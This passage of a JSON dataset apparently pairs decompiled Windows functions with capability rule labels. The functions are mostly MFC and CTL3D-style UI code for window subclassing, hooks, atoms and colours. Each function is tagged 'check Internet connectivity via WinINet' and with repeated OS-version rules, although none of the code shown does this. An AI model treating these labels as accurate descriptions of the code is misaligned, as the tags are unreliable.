        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.0040de84(void)\n\n{\n    code *pcVar1;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004077f4();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.std::ios_base.0;\n    pcVar1 = extraout_ECX[9];\n    *(unaff_EBP + -4) = 0;\n    if ((pcVar1 == NULL) || (pcVar1 = pcVar1 + 0x4305c4,  *pcVar1 = *pcVar1 + -1,  extraout_ECX[9][0x4305c4] < '\\x01'))\n    {\n        fcn.0040df98();\n    }\n    fcn.0040c30c();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 252
    },
    "0040c4b0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.0040c4b0(void)\n\n{\n    char cVar1;\n    code *pcVar2;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004077f4();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.std::basic_filebuf_char__struct_std::char_traits_char__.0;\n    cVar1 = *(extraout_ECX + 0x12);\n    *(unaff_EBP + -4) = 1;\n    if (cVar1 != '\\0') {\n        fcn.0040cbab();\n    }\n    pcVar2 = extraout_ECX[0x11];\n    if (pcVar2 != NULL) {\n        fcn.0040cad5(1);\n        fcn.00415cc6(pcVar2);\n    }\n    fcn.0040c30c();\n    *extraout_ECX = vtable.std::basic_streambuf_char__struct_std::char_traits_char__.0;\n    fcn.0040c30c();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 335
    },
    "0040d638": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.0040d638(void)\n\n{\n    char cVar1;\n    code *pcVar2;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004077f4();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.std::basic_filebuf_unsigned_short_int__struct_std::char_traits_unsigned_short_int__.0;\n    cVar1 = *(extraout_ECX + 0x12);\n    *(unaff_EBP + -4) = 1;\n    if (cVar1 != '\\0') {\n        fcn.0040db64();\n    }\n    pcVar2 = extraout_ECX[0x11];\n    if (pcVar2 != NULL) {\n        fcn.0040cad5(1);\n        fcn.00415cc6(pcVar2);\n    }\n    fcn.0040c30c();\n    *extraout_ECX = vtable.std::basic_streambuf_unsigned_short_int__struct_std::char_traits_unsigned_short_int__.0;\n    fcn.0040c30c();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 341
    },
    "0040e9a0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.0040e9a0(uint param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uStack76;\n    uint uStack72;\n    uint32_t uStack68;\n    uint uStack64;\n    uint32_t uStack60;\n    uint uStack56;\n    uint32_t uStack52;\n    uint uStack48;\n    uint32_t uStack44;\n    uint uStack40;\n    uint32_t uStack36;\n    uint uStack32;\n    uint32_t uStack28;\n    \n    pcVar1 = _sym.imp.USER32.dll_GetPropA;\n    uStack28 = *0x4319e8;\n    uStack32 = param_1;\n    uStack36 = 0x40e9bb;\n    iVar2 = (*_sym.imp.USER32.dll_GetPropA)();\n    if (iVar2 == 0) {\n        uStack36 = *0x4319ee;\n        uStack40 = param_1;\n        uStack44 = 0x40e9cf;\n        iVar2 = (*pcVar1)();\n        if (iVar2 == 0) {\n            uStack44 = *0x4319f2;\n            uStack48 = param_1;\n            uStack52 = 0x40e9e3;\n            iVar2 = (*pcVar1)();\n            if (iVar2 == 0) {\n                uStack52 = *0x4319ec;\n                uStack56 = param_1;\n                uStack60 = 0x40e9f7;\n                iVar2 = (*pcVar1)();\n                if (iVar2 == 0) {\n                    uStack60 = *0x4319f0;\n                    uStack64 = param_1;\n                    uStack68 = 0x40ea0b;\n                    iVar2 = (*pcVar1)();\n                    if (iVar2 == 0) {\n                        uStack68 = *0x4319ea;\n                        uStack72 = param_1;\n                        uStack76 = 0x40ea1b;\n                        iVar2 = (*pcVar1)();\n                        if (iVar2 == 0) {\n                            uStack76 = param_1;\n                            iVar2 = fcn.0040e930();\n                            if (iVar2 == 0) {\n                                if (*0x4324e5 != '\\0') {\n                                    uStack76 = param_1;\n                                    iVar2 = (*_sym.imp.USER32.dll_IsWindowUnicode)();\n                                    if (iVar2 == 0) {\n                                        uStack76 = 0x10;\n                                        (*_sym.imp.USER32.dll_GetClassNameA)(param_1, &stack0xffffffc0);\n                                        (*_sym.imp.KERNEL32.dll_lstrcmpiA)(&stack0xffffffb4, \"edit\");\n                                    }\n                                }\n                                uStack76 = uStack40;\n                                uVar3 = (*_sym.imp.USER32.dll_SetWindowLongA)(param_1, 0xfffffffc);\n                                (*_sym.imp.USER32.dll_SetPropA)(param_1, *0x4319ee, uVar3);\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 692
    },
    "0040ee50": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.0040ee50(uint param_1, char *param_2)\n\n{\n    char cVar1;\n    code *pcVar2;\n    uint uVar3;\n    char *pcVar4;\n    uint unaff_retaddr;\n    uchar *puVar5;\n    uchar auStack264 [4];\n    uchar auStack260 [4];\n    char acStack256 [248];\n    char **ppcStack8;\n    int32_t *piStack4;\n    \n    pcVar2 = _sym.imp.USER32.dll_CharNextA;\n    pcVar4 = acStack256;\n    cVar1 = *param_2;\n    while (cVar1 != '\\0') {\n        cVar1 = *param_2;\n        if (cVar1 == '&') {\n            param_2 = param_2 + 1;\n            if (*param_2 == '\\0') break;\ncode_r0x0040eea7:\n            cVar1 = *param_2;\n            param_2 = param_2 + 1;\n            *pcVar4 = cVar1;\n            pcVar4 = pcVar4 + 1;\n        }\n        else {\n            if (*0x4324e5 == '\\0') goto code_r0x0040eea7;\n            if (cVar1 == *0x4324e4) {\n                param_2 = param_2 + 1;\n                if (*param_2 != '\\0') goto code_r0x0040eea7;\n                break;\n            }\n            if ((cVar1 != '\\x1e') && (cVar1 != '\\x1f')) goto code_r0x0040eea7;\n            if (param_2[1] == '\\0') break;\n            param_2 = (*pcVar2)(param_2 + 1);\n        }\n        cVar1 = *param_2;\n    }\n    puVar5 = auStack264;\n    *pcVar4 = '\\0';\n    uVar3 = (*_sym.imp.KERNEL32.dll_lstrlenA)();\n    (*_sym.imp.GDI32.dll_GetTextExtentPointA)(unaff_retaddr, auStack260, uVar3);\n    *ppcStack8 = acStack256;\n    *piStack4 = puVar5;\n    return;\n}\n",
        "token_count": 493
    },
    "0040f040": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.0040f040(uint param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint32_t uVar4;\n    uint unaff_retaddr;\n    \n    if (*0x431a00 < 0x30a) {\n        return 0;\n    }\n    if (*0x4319e0 == 0) {\n        return 0;\n    }\n    uVar4 = param_2 | 1;\n    if ((param_2 & 2) != 0) {\n        uVar4 = param_2 & 0xfffffffc;\n    }\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(0x4319c0);\n    if (*0x431a3c != 0x80) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n        iVar2 = 0;\n        if (0 < *0x431a3c) {\n            piVar3 = 0x431a44;\n            do {\n                if (*piVar3 == iVar1) {\n                    piVar3 = iVar2 * 0x14 + 0x431a4c;\n                    *piVar3 = *piVar3 + 1;\n                    goto code_r0x0040f146;\n                }\n                piVar3 = piVar3 + 5;\n                iVar2 = iVar2 + 1;\n            } while (iVar2 < *0x431a3c);\n        }\n        iVar2 = (*_sym.imp.USER32.dll_SetWindowsHookExA)(5, 0x4101a0, *0x4319fc, iVar1);\n        if (iVar2 != 0) {\n            *(*0x431a3c * 0x14 + 0x431a40) = unaff_retaddr;\n            *(*0x431a3c * 0x14 + 0x431a44) = iVar1;\n            *(*0x431a3c * 0x14 + 0x431a48) = iVar2;\n            *(*0x431a3c * 0x14 + 0x431a4c) = 1;\n            *(*0x431a3c * 0x14 + 0x431a50) = uVar4;\n            *0x431a38 = *0x431a3c;\n            *0x431a3c = *0x431a3c + 1;\n            *0x431a34 = iVar1;\ncode_r0x0040f146:\n            (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x4319c0);\n            return 1;\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x4319c0);\n    return 0;\n}\n",
        "token_count": 620
    },
    "0040f280": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.0040f280(uint param_1)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t iVar6;\n    \n    if (*0x4319e0 != 0) {\n        iVar4 = (*_sym.imp.USER32.dll_GetWindowLongA)(param_1, 0xfffffffc);\n        pcVar2 = _sym.imp.USER32.dll_SetWindowLongA;\n        pcVar1 = _sym.imp.USER32.dll_RemovePropA;\n        iVar6 = 0;\n        do {\n            if (*(iVar6 * 0x18 + 0x432440) == iVar4) {\n                uVar5 = fcn.0040e950(param_1, iVar6);\n                (*pcVar1)(param_1, *0x4319ee);\n                (*pcVar2)(param_1, 0xfffffffc, uVar5);\n                iVar4 = 0;\n                iVar6 = 0x10;\n            }\n            pcVar3 = _sym.imp.USER32.dll_GetPropA;\n            iVar6 = iVar6 + 1;\n        } while (iVar6 < 6);\n        if (iVar6 == 6) {\n            if (iVar4 == 0x40fe30) {\n                uVar5 = fcn.0040e950(param_1, 6);\n                (*pcVar1)(param_1, *0x4319ee);\n                (*pcVar2)(param_1, 0xfffffffc, uVar5);\n            }\n            else {\n                iVar4 = (*_sym.imp.USER32.dll_GetPropA)(param_1, *0x4319ee);\n                if (((iVar4 != 0) || (iVar4 = (*pcVar3)(param_1, *0x4319f2),  iVar4 != 0)) ||\n                   (iVar4 = (*pcVar3)(param_1, *0x4319f0),  iVar4 != 0)) {\n                    (*_sym.imp.USER32.dll_SetPropA)(param_1, *0x4319f4, 1);\n                }\n            }\n        }\n        pcVar1 = _sym.imp.USER32.dll_GetWindow;\n        for (iVar4 = (*_sym.imp.USER32.dll_GetWindow)(param_1, 5); iVar4 != 0; iVar4 = (*pcVar1)(iVar4, 2)) {\n            fcn.0040f280(iVar4);\n        }\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 564
    },
    "0040f4d0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.0040f4d0(uint param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t unaff_ESI;\n    uint32_t uVar4;\n    uint16_t unaff_retaddr;\n    \n    pcVar1 = _sym.imp.USER32.dll_GetWindow;\n    if (*0x4319e0 != 0) {\n        iVar2 = (*_sym.imp.USER32.dll_GetWindow)(param_1, 5);\n        if (iVar2 != 0) {\n            uVar4 = unaff_ESI & 0xffff0000 | unaff_retaddr;\n            do {\n                fcn.0040f420(iVar2, uVar4, 0);\n                for (iVar3 = (*pcVar1)(iVar2, 5); iVar3 != 0; iVar3 = (*pcVar1)(iVar3, 2)) {\n                    fcn.0040f420(iVar3, uVar4, iVar2);\n                }\n                iVar2 = (*pcVar1)(iVar2, 2);\n            } while (iVar2 != 0);\n        }\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 266
    },
    "0040f5c0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.0040f5c0(uint32_t param_1, uint param_2, uint param_3)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    \n    if (((*0x4319e0 == 0) || (param_1 < 0x134)) || (param_1 == 0x137)) {\n        return 0;\n    }\n    if (param_1 == 0x134) {\n        if (*0x431a00 < 0x35f) {\n            iVar2 = (*_sym.imp.USER32.dll_GetWindow)(param_3, 5);\n            if (iVar2 != 0) {\n                uVar1 = (*_sym.imp.USER32.dll_GetWindowLongA)(param_3, 0xfffffff0);\n                if ((uVar1 & 3) != 3) goto code_r0x0040f614;\n            }\n        }\n        return 0;\n    }\ncode_r0x0040f614:\n    (*_sym.imp.GDI32.dll_SetTextColor)(param_2, *0x431a10);\n    (*_sym.imp.GDI32.dll_SetBkColor)(param_2, *0x431a08);\n    return *0x431a28;\n}\n",
        "token_count": 278
    },
    "0040f680": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuchar * fcn.0040f680(int32_t param_1, uint param_2, uchar *param_3, uint param_4, int32_t param_5)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    bool bVar5;\n    uint uVar6;\n    int32_t iVar7;\n    uchar *puVar8;\n    int32_t iVar9;\n    int32_t iStack136;\n    uchar *puStack132;\n    int32_t iStack128;\n    uchar *puStack124;\n    int32_t iStack120;\n    uchar *puStack116;\n    int32_t iStack112;\n    uchar *puStack108;\n    uchar *puStack104;\n    int32_t iStack100;\n    int32_t iStack96;\n    int32_t iStack92;\n    uint uStack88;\n    uchar *puStack84;\n    uchar *puStack80;\n    \n    if (param_5 == 0) {\n        puStack80 = 0x6;\n        puStack84 = param_1;\n        uStack88 = 0x40f6a2;\n        iStack96 = fcn.0040e950();\n    }\n    else {\n        iStack96 = 0;\n    }\n    puStack80 = param_4;\n    if (iStack96 == 0) {\n        puStack84 = param_3;\n        uStack88 = param_2;\n        iStack92 = param_1;\n        iStack96 = 0x40f6d3;\n        puStack80 = (*_sym.imp.USER32.dll_DefWindowProcA)();\n    }\n    else {\n        puStack84 = param_3;\n        uStack88 = param_2;\n        iStack92 = param_1;\n        iStack100 = 0x40f6c0;\n        puStack80 = (*_sym.imp.USER32.dll_CallWindowProcA)();\n    }\n    if (*0x4319e0 == 0) {\n        return puStack80;\n    }\n    iStack100 = param_1;\n    puStack104 = 0x40f6f5;\n    iVar1 = (*_sym.imp.USER32.dll_IsIconic)();\n    if (iVar1 != 0) {\n        return puStack84;\n    }\n    puStack80 = 0x1;\n    puStack104 = &stack0xffffffb0;\n    puStack108 = NULL;\n    iStack112 = 0x11ef;\n    puStack116 = param_1;\n    iStack120 = 0x40f722;\n    (*_sym.imp.USER32.dll_SendMessageA)();\n    iStack120 = 0xfffffff0;\n    puStack124 = param_1;\n    iStack128 = 0x40f72d;\n    uVar2 = (*_sym.imp.USER32.dll_GetWindowLongA)();\n    if ((puStack104 != NULL) && ((uVar2 & 0x10400080) == 0x10400080)) {\n        bVar5 = (uVar2 & 0xc00000) == 0xc00000;\n        iStack128 = param_1;\n        iVar4 = *0x4324d8 - bVar5;\n        puStack132 = 0x40f772;\n        uVar3 = (*_sym.imp.USER32.dll_GetWindowDC)();\n        puStack132 = &stack0xffffff9c;\n        iStack136 = param_1;\n        (*_sym.imp.USER32.dll_GetWindowRect)();\n        iStack100 = iStack100 - puStack108;\n        iStack96 = iStack96 - puStack104;\n        puStack104 = NULL;\n        puStack108 = NULL;\n        fcn.0040ec60(uVar3, &stack0xffffff94, 2, 7, 0xf);\n        puVar8 = &stack0xffffff94;\n        iVar9 = -1;\n        (*_sym.imp.USER32.dll_InflateRect)(puVar8, 0xffffffff, 0xffffffff);\n        fcn.0040ec60(uVar3, &stack0xffffff88, 0, 2, 0xf);\n        iVar7 = -1;\n        uVar6 = 0xffffffff;\n        (*_sym.imp.USER32.dll_InflateRect)(&stack0xffffff88, 0xffffffff, 0xffffffff);\n        iVar1 = (*_sym.imp.GDI32.dll_SelectObject)(uVar3, *0x431a28);\n        iStack120 = iStack136;\n        iStack112 = iStack128;\n        puStack116 = iVar9 + *0x4324d4;\n        puStack124 = iVar9;\n        fcn.0040ec30(uVar3, &stack0xffffff84);\n        (*_sym.imp.USER32.dll_OffsetRect)(&stack0xffffff84, puStack132 + (-*0x4324d4 - iVar9), 0);\n        fcn.0040ec30(uVar3, &stack0xffffff78);\n        iStack136 = iVar7 + *0x4324d4;\n        iStack128 = iVar1 - *0x4324d4;\n        puStack124 = puStack132 + iVar4;\n        fcn.0040ec30(uVar3, &stack0xffffff78);\n        if (bVar5) {\n            puStack116 = puStack132 + iVar4;\n            iStack120 = iStack136;\n            iStack112 = iStack128;\n            puStack108 = puStack116 + *0x4324dc;\n            fcn.0040ec60(uVar3, &stack0xffffff88, 2, 0, 0xf);\n        }\n        puStack132 = puStack132 + ((iVar9 - puVar8) - *0x4324d4);\n        puStack124 = puStack132 + *0x4324d8;\n        fcn.0040ec30(uVar3, &stack0xffffff78);\n        (*_sym.imp.GDI32.dll_SelectObject)(uVar3, uVar6);\n        (*_sym.imp.USER32.dll_ReleaseDC)(param_1, uVar3);\n    }\n    return puStack108;\n}\n",
        "token_count": 1345
    },
    "0040f930": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.0040f930(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    char *pcStack64;\n    uchar *puStack60;\n    uint uStack56;\n    uchar *puStack52;\n    char *pcStack48;\n    char *pcStack44;\n    char *pcStack40;\n    char *pcStack36;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    \n    if (*0x4324e5 != '\\0') {\n        uStack24 = 0x4319c0;\n        uStack28 = 0x40f94d;\n        (*_sym.imp.KERNEL32.dll_EnterCriticalSection)();\n        pcVar1 = _sym.imp.KERNEL32.dll_GetProfileStringA;\n        puStack32 = &stack0xfffffff0;\n        uStack28 = 9;\n        *0x4324e4 = 0x1e;\n        pcStack36 = \"roman\";\n        pcStack40 = \"kanjimenu\";\n        pcStack44 = \"windows\";\n        pcStack48 = 0x40f972;\n        (*_sym.imp.KERNEL32.dll_GetProfileStringA)();\n        pcVar2 = _sym.imp.KERNEL32.dll_lstrcmpiA;\n        puStack52 = &stack0xffffffdc;\n        pcStack48 = \"kanji\";\n        uStack56 = 0x40f984;\n        iVar3 = (*_sym.imp.KERNEL32.dll_lstrcmpiA)();\n        if (iVar3 == 0) {\n            *0x4324e4 = 0x1f;\n        }\n        puStack60 = &stack0xffffffd4;\n        uStack56 = 9;\n        pcStack64 = \"english\";\n        (*pcVar1)(\"windows\", \"hangeulmenu\");\n        iVar3 = (*pcVar2)(&stack0xffffffc0, \"hangeul\");\n        if (iVar3 == 0) {\n            *0x4324e4 = 0x1f;\n        }\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x4319c0);\n    }\n    return;\n}\n",
        "token_count": 474
    },
    "0040f9d0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint32_t fcn.0040f9d0(void)\n\n{\n    uint *puVar1;\n    code *pcVar2;\n    code *pcVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint *puVar7;\n    uint *puVar8;\n    uint uStack76;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    uint uStack56;\n    \n    uStack56 = 0x4319c0;\n    uStack60 = 0x40f9e1;\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)();\n    uStack60 = 0;\n    uStack64 = 0x40f9e9;\n    uVar4 = (*_sym.imp.USER32.dll_GetDC)();\n    pcVar2 = _sym.imp.GDI32.dll_GetDeviceCaps;\n    uStack64 = 0xc;\n    uStack72 = 0x40f9f6;\n    uStack68 = uVar4;\n    iVar5 = (*_sym.imp.GDI32.dll_GetDeviceCaps)();\n    uStack72 = 0xe;\n    uStack76 = uVar4;\n    iVar6 = (*pcVar2)();\n    pcVar2 = _sym.imp.USER32.dll_GetSystemMetrics;\n    *0x4319e0 = 3 < iVar5 * iVar6;\n    iVar5 = (*_sym.imp.USER32.dll_GetSystemMetrics)(1);\n    if ((iVar5 == 0x15e) && (iVar5 = (*pcVar2)(0),  iVar5 == 0x280)) {\n        *0x4319e0 = 0;\n    }\n    (*_sym.imp.USER32.dll_ReleaseDC)(0, uVar4);\n    pcVar3 = _sym.imp.KERNEL32.dll_GlobalAddAtomA;\n    if (*0x4319e0 != 0) {\n        *0x4319e8 = (*_sym.imp.KERNEL32.dll_GlobalAddAtomA)(0x42da70);\n        if ((*0x4319e8 != 0) && (*0x4319ee = (*pcVar3)(\"C3dNew\"),  *0x4319ee != 0)) {\n            *0x4319ec = (*pcVar3)(\"C3dL\");\n            *0x4319ea = (*pcVar3)(\"C3dH\");\n            if ((*0x4319ec == 0) || (*0x4319ea == 0)) {\n                *0x4319e0 = 0;\n                return 0;\n            }\n            *0x4319f2 = (*pcVar3)(\"C3dLNew\");\n            *0x4319f0 = (*pcVar3)(\"C3dHNew\");\n            if ((*0x4319f2 == 0) || (*0x4319f0 == 0)) {\n                *0x4319e0 = 0;\n                return 0;\n            }\n            *0x4319f4 = (*pcVar3)(\"C3dD\");\n            if (*0x4319f4 != 0) {\n                *0x4324e5 = (*pcVar2)(0x2a);\n                fcn.0040f930();\n                iVar5 = fcn.0040fca0(1);\n                pcVar2 = _sym.imp.USER32.dll_GetClassInfoA;\n                if (iVar5 != 0) {\n                    puVar8 = 0x41eee4;\n                    puVar7 = 0x432440;\n                    do {\n                        puVar1 = puVar8 + -5;\n                        *puVar7 = *puVar8;\n                        puVar8 = puVar8 + 8;\n                        (*pcVar2)(0, puVar1, &stack0xffffffb4);\n                        puVar7[1] = uStack72;\n                        puVar7 = puVar7 + 6;\n                    } while (puVar8 < vtable.exception.0);\n                    iVar5 = (*pcVar2)(0, 0x8002, &stack0xffffffb4);\n                    if (iVar5 == 0) {\n                        *0x4324d0 = _sym.imp.USER32.dll_DefDlgProcA;\n                    }\n                    else {\n                        *0x4324d0 = uStack72;\n                    }\n                    goto code_r0x0040fa6b;\n                }\n            }\n        }\n        *0x4319e0 = 0;\n    }\ncode_r0x0040fa6b:\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x4319c0);\n    return *0x4319e0;\n}\n",
        "token_count": 1023
    },
    "0040fbc0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.0040fbc0(void)\n\n{\n    code *pcVar1;\n    int32_t *piVar2;\n    uint32_t uVar3;\n    ushort uVar4;\n    ushort extraout_var;\n    \n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(0x4319c0);\n    piVar2 = 0x432440;\n    do {\n        if (*piVar2 != 0) {\n            *piVar2 = 0;\n        }\n        piVar2 = piVar2 + 6;\n    } while (piVar2 < 0x4324d0);\n    uVar3 = fcn.0040ec00();\n    pcVar1 = _sym.imp.KERNEL32.dll_GlobalDeleteAtom;\n    if (*0x4319e8 != 0) {\n        uVar3 = (*_sym.imp.KERNEL32.dll_GlobalDeleteAtom)(uVar3 & 0xffff0000 | *0x4319e8);\n    }\n    if (*0x4319ee != 0) {\n        uVar3 = (*pcVar1)(uVar3 & 0xffff0000 | *0x4319ee);\n    }\n    if (*0x4319ec != 0) {\n        uVar3 = (*pcVar1)(uVar3 & 0xffff0000 | *0x4319ec);\n    }\n    if (*0x4319ea != 0) {\n        uVar3 = (*pcVar1)(uVar3 & 0xffff0000 | *0x4319ea);\n    }\n    if (*0x4319f2 != 0) {\n        uVar3 = (*pcVar1)(uVar3 & 0xffff0000 | *0x4319f2);\n    }\n    uVar4 = uVar3 >> 0x10;\n    if (*0x4319f0 != 0) {\n        (*pcVar1)(uVar3 & 0xffff0000 | *0x4319f0);\n        uVar4 = extraout_var;\n    }\n    if (*0x4319f4 != 0) {\n        (*pcVar1)(CONCAT22(uVar4, *0x4319f4));\n    }\n    *0x4319e0 = 0;\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x4319c0);\n    return;\n}\n",
        "token_count": 519
    },
    "0040fca0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.0040fca0(int32_t param_1)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint16_t uVar5;\n    char *pcVar6;\n    uint *puVar7;\n    char *pcVar8;\n    uint *puVar9;\n    bool bVar10;\n    int32_t iStack80;\n    int32_t aiStack76 [4];\n    int32_t aiStack32 [4];\n    uint uStack16;\n    uint uStack12;\n    int32_t iStack8;\n    uint uStack4;\n    \n    pcVar1 = _sym.imp.USER32.dll_GetSysColor;\n    if (*0x4319e0 == 0) {\n        return 0;\n    }\n    uVar3 = 0;\n    do {\n        uVar5 = uVar3 + 1;\n        aiStack76[3] = *(uVar3 * 2 + 0x41ef90);\n        aiStack76[2] = 0x40fcd3;\n        uVar2 = (*pcVar1)();\n        *(&stack0xffffffe0 + uVar3 * 4) = uVar2;\n        uVar3 = uVar5;\n    } while (uVar5 < 8);\n    if (*0x431a00 == 0x300) {\n        aiStack32[0] = 0xffffff;\n    }\n    if (((iStack8 == 0) || (aiStack32[1] == iStack8)) && (iStack8 = 0xc0c0c0,  aiStack32[1] != 0x808080)) {\n        iStack8 = 0x808080;\n    }\n    bVar10 = param_1 == 0;\n    if (bVar10) {\n        iVar4 = 0x20;\n        pcVar6 = 0x431a04;\n        pcVar8 = &stack0xffffffe0;\n        do {\n            if (iVar4 == 0) break;\n            iVar4 = iVar4 + -1;\n            bVar10 = *pcVar6 == *pcVar8;\n            pcVar6 = pcVar6 + 1;\n            pcVar8 = pcVar8 + 1;\n        } while (bVar10);\n        if (bVar10) {\n            return 1;\n        }\n    }\n    aiStack76[3] = uStack4;\n    aiStack76[2] = uStack16;\n    aiStack76[1] = aiStack32[0];\n    aiStack76[0] = aiStack32[2];\n    iStack80 = aiStack32[1];\n  